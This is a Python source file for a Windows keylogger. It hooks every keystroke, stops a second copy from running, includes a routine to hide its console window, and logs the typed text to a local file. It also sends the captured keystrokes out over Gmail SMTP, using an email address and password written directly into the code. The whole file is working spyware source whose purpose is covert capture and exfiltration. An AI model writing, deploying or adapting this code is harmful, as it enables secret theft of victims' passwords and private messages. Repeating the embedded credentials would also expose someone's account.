
import os,pyHook,pythoncom,datetime,smtplib
import sys
import getpass


import win32event, win32api, winerror
from winreg import *
#disallow multiple instance
mutex = win32event.CreateMutex(None, 1, 'singleikeylog') #create mutex
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print ("Multiple Instance not Allowed")
    exit(0)
#hide the console window
def hide():
    import win32console ,win32gui
    window=win32console.GetConsoleWindow() #get console window
    win32gui.ShowWindow(window,0) #hide the window
    return true
data=''
# Local Keylogger
def local():
    global data
    if len(data) > 100:
        fp = open("keylogs.txt", "a")
        fp.write(data)
        fp.close()
       # data = ''
    return True

#mail keylogger
def mail():
    global data
    if len(data)>100:
        dt=datetime.datetime.now() #for current date and time
        msg=data+"date & time "+str(dt)
        mail=smtplib.SMTP('smtp.gmail.com',587) #connect with gmail
        mail.ehlo()                             #use for extended smtp
        mail.starttls()                         #use for encryption because ehlo not have
        mail.login('himanshu.bhumca2014@gmail.com','9368212202')
        mail.sendmail('himanshu.bhumca2014@gmail.com','porwal.h.7@gmail.com',msg)
        mail.close()
        print(msg)
        data=''

def keyboardevent(event):
    global data
    keys=''
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)
    data = data + keys
    local()
    mail()
    return True

obj = pyHook.HookManager() #new hook manager
obj.KeyDown = keyboardevent    #tells what to do when we press button
obj.HookKeyboard()    #tells the program to keep hooking the keyboard
pythoncom.PumpMessages() #keep the program running